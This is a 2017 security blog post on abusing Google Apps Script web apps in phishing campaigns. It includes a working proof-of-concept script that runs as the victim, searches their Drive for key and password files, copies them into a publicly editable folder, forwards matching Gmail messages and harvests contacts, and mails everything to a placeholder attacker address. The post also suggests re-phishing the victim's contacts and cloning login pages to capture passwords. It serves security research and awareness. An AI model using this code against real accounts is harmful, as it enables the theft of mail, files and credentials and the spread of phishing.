---
title: "Abusing Google App Scripting Through Social Engineering"
date: 2017-02-27T17:57:00.002-05:00
draft: false
type: posts
---
# Abusing Google App Scripting Through Social Engineering

<br/>

<br/>
I recently joined a new company (hooray) and have had the opportunity thus far to start thinking more heavily about a few topics that are, I suppose, newer to me.  

  

Most of this focus has been on Google Apps for Business, but generally speaking, we've been thinking about many different challenges that are posed by large enterprises adopting cloud solutions. Often these services lack; functionality required at the enterprise level (sometimes something basic such as logging of a particular event), inter-operability with other cloud services (leading to the rise of CASB tools), and a reactive API driven approach to security and monitoring. Although many CASB solutions offer API driven monitoring of a great variety of services, this is by it's nature a reactive or detective approach.

  

The recent [Cloudflare edge server vulnerability](https://bugs.chromium.org/p/project-zero/issues/detail?id=1139) disclosed by Tavis Ormandy is a great example of a type of risk posed by wide-spread adoption of the 'cloud'. This isn't to say that I think the cloud is inherently insecure, or that I'm arguing against it's adoption. Quite the contrary. The economic drivers supporting cloud adoption are difficult (at best) to argue against, and that alone is sufficient justification for the business to modify internal IT practice.

  

However, it is important to recognize that structural changes brought about by the widespread adoption of something 'new' and shiny, can often lead to blind spots in our understanding of how it can be abused.

  

If we think of hacking or information security attacks as goal driven endeavors that commonly have an end state of data theft, or data destruction, than we have to acknowledge that the means by which we accomplish these tasks can vary significantly. Typically, this would require exploiting some sort of web application vulnerability and reading tables from a back end database. In recent years, the PowerShell Empire tool has included a number of fantastic scripts that allow you to hunt across file shares for sensitive data. There are a variety of exfiltration methods available to an attacker.

  

So .....

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVnql55Ack4_4XSayp6XhFs0qjL8mjp5MtDTUleEMLRixeyAnT2fUUs9_EXvZHau8NGlrblNu-oTE1iHXEBeF7AQGNeaJ5wd797wgEeR2DC6wSti1gCV34U084MVhUrAgBwt9KlcLLwv8/s320/morpheus.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVnql55Ack4_4XSayp6XhFs0qjL8mjp5MtDTUleEMLRixeyAnT2fUUs9_EXvZHau8NGlrblNu-oTE1iHXEBeF7AQGNeaJ5wd797wgEeR2DC6wSti1gCV34U084MVhUrAgBwt9KlcLLwv8/s1600/morpheus.jpg)

You'd probably say stop it with the memes and get to the point Greg. Ok, fine.

  

With some clever social engineering, and abuse of [Google App Scripts](https://www.google.com/script/start/), you can accomplish exactly this. Please keep in mind, this post is focusing specifically on Google Apps for Business users or personal Gmail users.

  

What are Google App Scripts?

Google App Scripts is essentially a Javascript (although the file extension is designated '.GS') based cloud scripting language that allows you to automate tasks across the range of Google services. There are a number of feature-rich APIs for accessing Gmail, Drive, Calendar, Contacts, etcetera. 

  

For first time users, if you browse to [script.google.com](https://script.google.com/) you'll be presented with the web UI for developing GS scripts. The detailed API reference manual can be found [here](https://developers.google.com/apps-script/reference/calendar/). There are several ways to utilize App Scripts. They can be embedded in a Google Sheet or a Google Doc. But what I am most interested in is the ability to 'Deploy as Web App'. Why? It specifically has to do with the permission set.

> The permissions for a web app differ depending on whether you choose to execute the app as the owner of the script or as the active user who is accessing the web app.
> 
> If you choose for the script to execute as you, then the script will always execute under your identity, that is, the identity of the owner of the script. This will be the case regardless of which user is accessing the web app.
> 
> _If you choose for the script to execute as the user who accesses the web app, then the script will execute under the identity of the active user who is accessing your script._

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid5h5d3y8BkYWna9XYpC6lKIvSkMjZgwvS0HcLYSjbls8TSeCyoltOHD1RY66p35CLOr4fiQ9O6T787VWv57BD-I3LFyKcExKWQVHeJ15p2WJRUjejBxRB6EcpuU-XMJhmEmZEcOuiAgQ/s320/i+choose+you.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid5h5d3y8BkYWna9XYpC6lKIvSkMjZgwvS0HcLYSjbls8TSeCyoltOHD1RY66p35CLOr4fiQ9O6T787VWv57BD-I3LFyKcExKWQVHeJ15p2WJRUjejBxRB6EcpuU-XMJhmEmZEcOuiAgQ/s1600/i+choose+you.png)

That last part (italicized), is the crucial element. After you have written your Google App Script, and you want to Deploy it, you can specify that the script executes as the user accessing the page like so:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDrLtZ7kIYgCXZa46n91K27UBos_WqT6df3fJc2xSdMklouo4Iqc49-djFz82mZqC3wTC0odktB1e08jg4hISNvps4bYnIrjimw0f6YrC332QMzR9gJEm8CvnY37uLg2iTFpF2CqQKKMo/s320/deploy+web+app.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDrLtZ7kIYgCXZa46n91K27UBos_WqT6df3fJc2xSdMklouo4Iqc49-djFz82mZqC3wTC0odktB1e08jg4hISNvps4bYnIrjimw0f6YrC332QMzR9gJEm8CvnY37uLg2iTFpF2CqQKKMo/s1600/deploy+web+app.PNG)

Now, whenever a user visits this link they will be presented with a permissions acceptance dialog prompt that varies depending on the type of functionality we build into our Google App Script:

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggqB7gR-06-iRxrNMVENwBG0_0aw5wVkknomoK5icAcTz6ZFEMxRfUazXD6VeD1aSQS01RlS9cyc5fj9fvvEl17KJ8-qmYAWrUkJP7Sa21vmpiOpD5URrepOVADx2OG0SYa0gy7jcgyDw/s320/permissions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggqB7gR-06-iRxrNMVENwBG0_0aw5wVkknomoK5icAcTz6ZFEMxRfUazXD6VeD1aSQS01RlS9cyc5fj9fvvEl17KJ8-qmYAWrUkJP7Sa21vmpiOpD5URrepOVADx2OG0SYa0gy7jcgyDw/s1600/permissions.PNG)

Followed By:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLgDtyh-zbwG6LZntmQwtLpwAsyfx5Jp-BjhGEusdPoX8tOyJSTH8-QzEXTfIS43TOzYOj5BS2WKBiIDIa82TGG_KsEggidW9QbYAyhopCXdUe8l-bkJjELOcREN-dRODBrZmb5m5JtwA/s320/permissions2.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLgDtyh-zbwG6LZntmQwtLpwAsyfx5Jp-BjhGEusdPoX8tOyJSTH8-QzEXTfIS43TOzYOj5BS2WKBiIDIa82TGG_KsEggidW9QbYAyhopCXdUe8l-bkJjELOcREN-dRODBrZmb5m5JtwA/s1600/permissions2.PNG)

I view this as the equivalent of 'enable macros'. Sure, an educated and aware user may stop at these prompts and realize that something is amiss. However, for a lot of users, they aren't going to necessarily recognize anything bad here. This is a google.com domain requesting permissions, the application itself is hosted and served by google. If the phishing lure is convincing enough, you can guarantee that many users will happily accept these warnings. Google does not provide any warning that the script could be from a third party or that it may in fact be malicious. The dialogue boxes do not 'feel' security related. Like many things in security, it comes down to user awareness.

  

So - what exactly can we do once the user clicks allow? I've written up a PoC to demonstrate some use-cases and I'll walk through these below. Do we get code execution? No. But again, if our goal is access to/destruction of data, does it matter how we achieve that, especially in a world where our perimter is porous and infrastructure design is increasingly cloud/service based? Moreover, use of this technique can be extremely powerful in extracting sensitive information from an organization that can be used for highly targeted follow up attacks that may increase the likelihood of successful exploitation. From a reconnaissance perspective, this takes Phishing to the next level (you aren't just getting, for example, User-Agent settings, now you can get actual internal data from the organization).

-   Create your application entry point. Since we are going to deploy this as a Web Application we need a doGet or doPost handler routine.

> // Application Entry Point  
> // Application published to web requires doGet or doPost  
> function doGet(e) {  
>   var params = JSON.stringify(e);  
>   drivePassSearch();  
>   gmailKeySearch();  
>   contactsRePhish();  
>   return HtmlService.createHtmlOutput('Index');  
> }

-   You can see we call the drivePassSearch function first. **This will search through the victims Google Drive shares for file names matching a key word and steal them**. This function creates a publicly available RWX folder in the users Drive account. You can apparently [disable this](https://support.google.com/a/answer/60781?hl=en) for Google Apps for Business users although I believe everything is very 'open' by default. Not sure if personal users have any such capability. 
-   It searches for files on Drive that match our search criteria, records their name and location, makes a copy of the file in the public Drive share, and then emails a publicly accessible link to this share back to our attacker email address.
-   What are some use cases here? You can construct a search query for sensitive files housed on Drive. I've seen several organizations migrate entire file shares or Sharepoint deployment to Drive with all sorts of sensitive data. Look for PDFs, DOCX, XLSX files. You can search in the filename or inside the content of the document as well. It is also possible to use logical operators

-   'fullText contains SOMETHING'
-   'title contains SOMETHING'
-   'and (mimeType contains 'image/' or mimeType contains 'video/')

-   Try searching for file name containing .cer, .pem, .der, .crt, .pub, id\_rsa, .docx, .pdf, .vsd, .nessus, .dit, password, etc - Get Creative!

function drivePassSearch() {

  var folder = DriveApp.createFolder('Evil Folder');

  folder.setSharing(DriveApp.Access.ANYONE, DriveApp.Permission.EDIT);

  var files = DriveApp.searchFiles(

     'modifiedDate > "2013-02-28" and title contains "SEARCHTERM"');

 while (files.hasNext()) {

   var file = files.next();

   Logger.log(file.getDownloadUrl());

   Logger.log(file.getUrl());

   Logger.log(file.getName());

   var name = file.getName();

   file.makeCopy(name,folder);

   Logger.log(file.getDownloadUrl());

   Logger.log(file.getUrl());

 }

-   Now we take the data recorded by Logger and send it in an email back to our attacker email address. The message will come from the victim.

  Logger.log(folder.getUrl());

  var recipient = "ATTACKEREMAIL";

  var subject = 'Google Drive Query';

  var body = Logger.getLog();

  MailApp.sendEmail(recipient, subject, body);

-   If the organization has disabled publicly accessible Drive shares then you can use this workaround. Instead of uploading all files to this world-accessible Drive share, you can instead attach the file as a Blob to an email and send it to your attacker email address. 
-   This message will come from the victim user account. 
-   Warning: if your search term finds multiple files, it will send each one in a separate email. There are limits to how many emails a single account can send in a day.

  var file = DriveApp.getFilesByName('SEARCHTERM');

  var fileBlob = file.next().getBlob();

  if (file.hasNext()) {

    MailApp.sendEmail(recipient,'Google Drive search - Attached Files','Attached file matched a search term during Google Drive app script search.',{attachments: \[fileBlob\], name: file.next().getName()})

  }

   Logger.clear();

  

}

  

-   Next - **we want to steal emails**. 
-   Similarly we construct a search against GmailApp. The search term specified in that function is the same format as Gmail searches you are used to doing ([link](https://support.google.com/mail/answer/7190?hl=en)).
-   This function will search through all mail, and if it finds a message matching the search criteria, it will forward it to our attacker email address.Use cases; forward all emails with an attachment, forward all emails with the word confidential, forward all emails that are starred, etc

function gmailKeySearch() {

  var threads = GmailApp.search('subject:SEARCHTERM');

  for (var h = 0; h < threads.length; h++) {

    var messages = threads\[h\].getMessages();

    for (var i = 0; i < messages.length; i++) {

      if (messages\[i\].isStarred())

      {

        Logger.log(messages\[i\].getSubject());

        var subject = messages\[i\].getSubject();

        Logger.log(messages\[i\].getBody());

        var body = messages\[i\].getBody();

        Logger.log(messages\[i\].getId());

        var id = messages\[i\].getId();

        MailApp.sendEmail({

          to: "ATTACKEREMAILADDRESS",

          subject: subject,

          htmlBody: body,

       }); 

          }

      }

    }

}

  

-   Lastly, we mine the contacts database for information, composite a list of contacts, and send it back to our attacker email address.
-   Why? **Attackers can use this to target additional individuals within the organization, construct bigger email spam lists, and just generally it's good to compile more information about your target.**

  

function contactsRePhish() {

  var contacts = ContactsApp.getContacts();

  // Only pulling name and primary email, many other fields to extract from

  for (var i=0; i<contacts.length; i++) {   

    var name = contacts\[i\].getFullName();    

    var email = contacts\[i\].getPrimaryEmail();

    Logger.log("Name: "+name+" Email: "+email);

  }

  

  var recipient = "ATTACKEREMAILADDRESS";

  var subject = 'Full List of Contacts';

  var body = Logger.getLog();

  MailApp.sendEmail(recipient, subject, body);

  Logger.clear();  

  

}

-   Keep in mind - **with the example above we could have the victim user send an email from their account, to each of their contacts, asking them to click a link, or fill in information on a phishing website we have constructed**. This is a great way to internally re-phish other users in an extremely convincing manner.

I'm sure people much smarter than myself could come up with other use cases. A few I haven't had time to explore; permanently delete all mail, permanently delete all Drive files, upload malicious files to drive, and create triggers to setup a recurring task.

  

Lastly, at the end of our doGet(e) application handling function, we return an object "HtmlService.createHtmlOutput('Index')". Index refers to an HTML file that we are passing to this object. The HTML file can be created in the script editor UI by going to File -> New -> HTML file. You can place whatever content in this HTML file to support your Phishing scenario (I'd suggest HTTrack to clone a web page from your target, perhaps a Citrix/RAS login page). You can have it look a BeEF JS hook, post form fields (such as passwords) out to listening web servers under your control, etc. The best part of the 'deploy as web app' option is that we can actually deploy a functional web application in addition to all of the core data search and exfiltration functionality.

  

This isn't the first I've heard of Google App Script 'abuse'. There are a number of malware researchers who have published articles about [Carbanak abusing Google App Scripts to host C2 infrastructure](https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-and-control). But I have yet to see or read about Google App scripting abuse in a social engineering context.  
  
**Edit:** A friend sent me a link to a post from Andrew Cantino back in 2014, appears to be the first mention of this issue [http://blog.andrewcantino.com/blog/2014/09/08/example-of-poor-security-communication-in-google-auth-flow/](http://blog.andrewcantino.com/blog/2014/09/08/example-of-poor-security-communication-in-google-auth-flow/). Kudos to Andrew for identifying this issue and raising it with Google. I think it needs more attention/discussion.

  

For full code sample go here: [https://github.com/gregkcarson/GoogleAppScriptSE](https://github.com/gregkcarson/GoogleAppScriptSE)

  

Thanks, and feedback is welcome as per usual.

#### [Source](https://www.redblue.team/feeds/2368629716996771957/comments/default)

<br/>
---
